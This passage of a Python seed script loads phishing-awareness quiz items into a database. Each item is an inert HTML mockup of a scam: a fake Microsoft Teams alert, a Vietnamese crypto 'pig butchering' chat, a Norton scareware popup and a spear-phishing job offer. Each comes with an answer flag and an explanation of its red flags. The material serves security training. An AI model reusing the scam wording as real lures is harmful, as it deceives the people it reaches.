        "explanation": "This is a PHISHING email delivering a macro-based malware payload. Red flags: (1) The sender is not your company's internal analytics team — the domain 'business-reports-online.com' is external and unrecognized. (2) The .xlsm extension indicates a macro-enabled Excel file, which can execute arbitrary code. (3) The instruction to 'Enable Content' is the attacker's key step — macros are disabled by default exactly because they are abused this way. (4) Legitimate internal reports do not arrive unsolicited from unknown external senders. Never enable macros on unexpected files.",
    },

    # ── 17 ── Fake Microsoft Teams notification (EN) ──────────────────────────
    {
        "title": "Fake Microsoft Teams missed messages notification",
        "scenario_type": "email",
        "content": """<div class="email-mockup">
  <div class="email-header">
    <div class="email-field"><span class="label">From:</span> <span class="value">notify@ms-teams-alerts.com</span></div>
    <div class="email-field"><span class="label">To:</span> <span class="value">__USER_EMAIL__</span></div>
    <div class="email-field"><span class="label">Subject:</span> <span class="value">You have 3 missed messages in Microsoft Teams</span></div>
  </div>
  <div class="email-body">
    <div style="display:flex;align-items:center;gap:8px;margin-bottom:16px">
      <div style="background:#6264a7;color:white;width:32px;height:32px;border-radius:6px;display:flex;align-items:center;justify-content:center;font-weight:bold">T</div>
      <span style="font-weight:600;color:#6264a7">Microsoft Teams</span>
    </div>
    <p>You have <strong>3 unread messages</strong> waiting for you.</p>
    <div style="border:1px solid #eee;border-radius:8px;overflow:hidden;margin:12px 0">
      <div style="padding:10px 14px;border-bottom:1px solid #eee;font-size:13px"><strong>David L.</strong> — "Can you check the attached report and confirm?"</div>
      <div style="padding:10px 14px;border-bottom:1px solid #eee;font-size:13px"><strong>Sarah K.</strong> — "Hi, please review the document I shared."</div>
      <div style="padding:10px 14px;font-size:13px"><strong>IT Support</strong> — "Your account will be suspended. Verify now."</div>
    </div>
    <a href="#" onclick="return false;" style="background:#6264a7;color:white;padding:10px 24px;text-decoration:none;border-radius:4px;display:inline-block">Open Teams Messages</a>
    <p style="font-size:11px;color:#aaa;margin-top:16px">© Microsoft Corporation. All rights reserved.</p>
  </div>
</div>""",
        "is_phishing": True,
        "explanation": "This is a PHISHING email impersonating Microsoft Teams notifications. Red flags: (1) Sender domain is 'ms-teams-alerts.com' — legitimate Teams emails come from '@microsoft.com'. (2) The fake message from 'IT Support' about account suspension is a classic urgency tactic. (3) Clicking 'Open Teams Messages' leads to a fake Microsoft login page to steal credentials. (4) Real Teams notification emails link to 'teams.microsoft.com'. Always open Teams directly via the app or by typing teams.microsoft.com.",
    },

    # ── 18 ── Crypto pig butchering scam (VI) ────────────────────────────────
    {
        "title": "Tin nhắn lừa đảo đầu tư crypto (pig butchering)",
        "scenario_type": "text",
        "content": """<div style="font-family:Arial,sans-serif;max-width:400px;margin:auto">
  <div style="background:#075e54;color:white;border-radius:16px 16px 0 0;padding:12px 16px;font-size:13px;display:flex;align-items:center;gap:8px">
    <span style="background:#25d366;border-radius:50%;width:32px;height:32px;display:flex;align-items:center;justify-content:center">💬</span>
    <span><strong>Linh Nguyễn</strong> — WhatsApp</span>
  </div>
  <div style="background:#e5ddd5;border-radius:0 0 16px 16px;padding:16px">
    <div style="background:white;border-radius:16px 16px 4px 16px;padding:12px 14px;font-size:14px;margin-bottom:8px">
      <p style="margin:0 0 6px">Chào anh/chị! Em là Linh, chuyên viên tài chính tại Hà Nội. Em vô tình nhắn nhầm nhưng thấy profile của anh/chị rất chuyên nghiệp 😊</p>
    </div>
    <div style="background:white;border-radius:4px 16px 16px 16px;padding:12px 14px;font-size:14px;margin-bottom:8px">
      <p style="margin:0 0 6px">Em đang dùng nền tảng <strong>CryptoGold Pro</strong> theo hướng dẫn của chú em làm ở quỹ đầu tư Singapore. Tuần trước em rút được <strong>120 triệu</strong> 💰</p>
    </div>
    <div style="background:white;border-radius:4px 16px 16px 16px;padding:12px 14px;font-size:14px;margin-bottom:8px">
      <p style="margin:0 0 6px">Anh/chị có muốn em hướng dẫn không? Vốn tối thiểu chỉ 5 triệu, lợi nhuận 15-30%/tuần. Đây là link đăng ký: <a href="#" onclick="return false;" style="color:#0070f3">cryptogold-pro.vip/register</a></p>
    </div>
  </div>
</div>""",
        "is_phishing": True,
        "explanation": "Đây là lừa đảo 'Pig Butchering' (thả thính đầu tư tiền điện tử). Cơ chế: (1) Tiếp cận qua tin nhắn 'nhầm số' để tạo quen biết giả tạo. (2) Xây dựng lòng tin bằng câu chuyện thành công và mối quan hệ gia đình. (3) Cho rút tiền nhỏ ban đầu để tạo niềm tin, sau đó khoá tài khoản khi nạn nhân nạp số tiền lớn. (4) Domain '.vip' không phải nền tảng tài chính hợp lệ. Không đầu tư vào bất kỳ nền tảng nào được giới thiệu qua mạng xã hội bởi người lạ.",
    },

    # ── 19 ── Fake Norton antivirus popup (VI) ────────────────────────────────
    {
        "title": "Popup giả mạo Norton diệt virus hết hạn",
        "scenario_type": "text",
        "content": """<div style="font-family:Arial,sans-serif;max-width:440px;margin:auto;border:2px solid #ffc107;border-radius:8px;overflow:hidden;box-shadow:0 4px 20px rgba(0,0,0,0.15)">
  <div style="background:#ffc107;color:#333;padding:12px 16px;font-weight:bold;font-size:15px;display:flex;align-items:center;gap:8px">
    <span>🛡️</span> NORTON — Cảnh báo bảo mật khẩn cấp
  </div>
  <div style="padding:20px">
    <p style="font-weight:bold;margin-top:0">Gói bảo vệ Norton của bạn đã <span style="color:red">HẾT HẠN</span>!</p>
    <div style="background:#fff3e0;border-radius:6px;padding:12px;margin:10px 0;font-size:13px">
      <div>🔴 Trojans phát hiện: <strong>3</strong></div>
      <div>🔴 Spyware phát hiện: <strong>7</strong></div>
      <div>🔴 Adware phát hiện: <strong>12</strong></div>
    </div>
    <p style="font-size:13px;color:#555">Thiết bị của bạn đang bị theo dõi và dữ liệu ngân hàng có thể đã bị lộ. Gia hạn ngay để bảo vệ:</p>
    <button onclick="return false;" style="width:100%;background:#e53935;color:white;padding:12px;border:none;font-size:15px;font-weight:bold;cursor:pointer;border-radius:4px;margin-bottom:8px">⚡ Gia hạn ngay — Chỉ 299.000đ/năm</button>
    <button onclick="return false;" style="width:100%;background:transparent;color:#999;padding:8px;border:1px solid #ddd;font-size:12px;cursor:pointer;border-radius:4px">Bỏ qua (không được khuyến nghị)</button>
  </div>
</div>""",
        "is_phishing": True,
        "explanation": "Đây là PHISHING kiểu Scareware giả mạo Norton. Dấu hiệu: (1) Norton và mọi phần mềm diệt virus thật thông báo qua ứng dụng cài sẵn, không phải popup trình duyệt. (2) Danh sách virus cụ thể (3 Trojan, 7 Spyware) là giả tạo để gây hoảng loạn. (3) Nhấn 'Gia hạn' dẫn đến trang thanh toán giả để đánh cắp thông tin thẻ tín dụng. (4) Nút 'Bỏ qua (không được khuyến nghị)' là kỹ thuật thao túng tâm lý. Đóng tab và kiểm tra ứng dụng Norton thật trên máy tính.",
    },

    # ── 20 ── Spear phishing job offer with attachment (EN) ───────────────────
    {
        "title": "Spear phishing job offer with malicious PDF attachment",
        "scenario_type": "email",
        "content": """<div class="email-mockup">
  <div class="email-header">
    <div class="email-field"><span class="label">From:</span> <span class="value">recruitment@financialcareers-apac.com</span></div>
    <div class="email-field"><span class="label">To:</span> <span class="value">__USER_EMAIL__</span></div>
    <div class="email-field"><span class="label">Subject:</span> <span class="value">Exclusive Opportunity: Senior Financial Analyst — DBS Bank Singapore</span></div>
  </div>
  <div class="email-body">
    <p>Dear Candidate,</p>
    <p>I came across your profile on LinkedIn and believe you are an excellent fit for a <strong>Senior Financial Analyst</strong> position at a leading bank in Singapore. Compensation: <strong>SGD 12,000–15,000/month</strong> + relocation package.</p>
    <div style="border:1px solid #ddd;border-radius:6px;padding:12px;margin:12px 0;background:#f9f9f9;display:flex;align-items:center;gap:12px">
      <span style="font-size:28px">📄</span>
      <div>
        <div style="font-weight:600;color:#c62828">JobDescription_SeniorAnalyst_DBS.pdf</div>
        <div style="font-size:12px;color:#888">PDF Document · 892 KB · Please open to confirm interest</div>
      </div>
    </div>
    <a href="#" onclick="return false;" style="background:#1565c0;color:white;padding:9px 20px;text-decoration:none;border-radius:4px;display:inline-block">Open Job Description</a>
    <p style="margin-top:14px;font-size:13px">Please respond within 48 hours to be considered for the fast-track process.</p>
    <p style="font-size:12px;color:#888">Amanda Teo · Senior Recruitment Consultant<br>Financial Careers APAC | financialcareers-apac.com</p>
  </div>
</div>""",
        "is_phishing": True,
        "explanation": "This is a Spear Phishing email targeting finance professionals with a fake job offer. Red flags: (1) The recruiter domain 'financialcareers-apac.com' is not a verified, established recruitment firm — check on LinkedIn before responding. (2) The attached PDF likely exploits Adobe Reader vulnerabilities or uses JavaScript to steal credentials / drop malware when opened. (3) Unrealistically high salary with urgency ('48 hours') is a classic lure for high-value targets. (4) Legitimate recruiters at reputable firms use verified company domains. Never open unsolicited job offer attachments without verification.",
    },
]


def add_new_questions():
    added = 0
    skipped = 0
    existing_titles = {q.title for q in Question.query.all()}

    for q_data in NEW_QUESTIONS:
        if q_data["title"] in existing_titles:
            print(f"  [skip] {q_data['title']}")
            skipped += 1
            continue
        question = Question(**q_data)
        db.session.add(question)
        print(f"  [add]  {q_data['title']}")
        added += 1

    db.session.commit()
    print(f"\nDone. Added: {added}, Skipped (duplicate): {skipped}")


if __name__ == "__main__":
    with app.app_context():
        add_new_questions()
